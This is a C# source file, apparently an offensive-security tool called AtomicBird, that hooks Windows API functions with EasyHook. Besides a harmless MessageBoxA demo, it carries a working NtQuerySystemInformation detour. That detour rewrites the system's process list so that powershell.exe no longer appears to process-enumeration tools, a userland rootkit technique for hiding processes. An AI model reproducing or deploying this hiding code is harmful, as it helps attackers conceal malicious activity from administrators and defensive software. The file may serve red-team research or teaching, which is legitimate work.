using System;
using System.IO;
using System.Runtime.InteropServices;

namespace AtomicBird
{
    class Program
    {
        // MessageBoxA detour
        // ==> A simple example for context..
        //----------------------------------
        static private int MessageBoxDetour(IntPtr hWnd, String text, String caption, int options)
        {
            Console.Write("Hook => {Text: " + text + ", Caption: " + caption + ", Option: " + options + "}\n");
            text = "Hooked";
            caption = "Mmm";
            options = 1;
            return API.MessageBoxA(hWnd, text, caption, options);
        }

        public static void MsgBoxHookTest()
        {
            var hook = EasyHook.LocalHook.Create(EasyHook.LocalHook.GetProcAddress("user32.dll", "MessageBoxA"), new API.DELEGATES.MessageBoxA(MessageBoxDetour), null);
            hook.ThreadACL.SetInclusiveACL(new int[] { 0 }); // Only hook our thread
            API.MessageBoxA(IntPtr.Zero, "Text", "Cap", 0);
            hook.ThreadACL.SetExclusiveACL(new int[] { 0 });
            API.MessageBoxA(IntPtr.Zero, "Not hooked!", "Cap", 0); // Unhook
        }

        // NtQuerySystemInformation detour
        //----------------------------------
        static private UInt32 NtQuerySystemInformationDetour(UInt32 SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, IntPtr ReturnLength)
        {
            // Call original function
            UInt32 CallRes = API.NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

            // Rewrite linked list if == 0x5 -> SystemProcessInformation
            if (CallRes == 0 && SystemInformationClass == 5)
            {
                // !!CHANGE THIS PATH FOR TESTING!!
                string LogPath = @"C:\Users\b33f\Desktop\HookLog.txt";
                if (!File.Exists(LogPath))
                {
                    File.WriteAllText(LogPath, Banner);
                }

                File.AppendAllText(LogPath, "Called ==> SystemProcessInformation\n");

                int StructOffset = 0;
                while (true)
                {
                    int nextOffset = Marshal.ReadInt32(SystemInformation);
                    IntPtr Name_Ptr = Marshal.ReadIntPtr((IntPtr)(SystemInformation.ToInt64() + 64));
                    String Name = Marshal.PtrToStringUni(Name_Ptr);
                    if (Name == "powershell.exe")
                    {
                        File.AppendAllText(LogPath, "[!] Found Powershell => rewriting linked list\n");
                        IntPtr lastOffset = (IntPtr)(SystemInformation.ToInt64() - StructOffset);
                        Marshal.WriteInt32(lastOffset, (Marshal.ReadInt32(lastOffset) + nextOffset));
                        StructOffset = (Marshal.ReadInt32(lastOffset) + nextOffset);
                    } else
                    {
                        StructOffset = nextOffset;
                    }

                    // End of linked list?
                    if (nextOffset == 0)
                    {
                        break;
                    } else
                    {
                        SystemInformation = (IntPtr)(SystemInformation.ToInt64() + nextOffset);
                    }
                }
            }

            // Return the callres to the caller
            return CallRes;
        }

        public static void NtQuerySystemInformationHook()
        {
            var hook = EasyHook.LocalHook.Create(EasyHook.LocalHook.GetProcAddress("ntdll.dll", "NtQuerySystemInformation"), new API.DELEGATES.NtQuerySystemInformation(NtQuerySystemInformationDetour), null);
            hook.ThreadACL.SetExclusiveACL(new int[] { 0 }); // Hook all threads except our thread
            while (true)
            {
                System.Threading.Thread.Sleep(200);
            }
            
        }

        // Because Ascii
        //----------------------------------
        static String Banner = @"
              .---.        .-----------
             /     \  __  /    ------
            / /     \(  )/    -----  Atomic
           //////   ' \/ `   ---       Bird
          //// / // :    : ---
         // /   /  /`    '--
        //          //..\\      ~b33f~
               ====UU====UU====
                   '//||\\`
                     ''``
";

        static void Main(string[] args)
        {
            // Hook MessageBoxA for demo purposes
            MsgBoxHookTest();

            // Hook NtQuerySystemInformation
            //NtQuerySystemInformationHook();
        }
    }
}
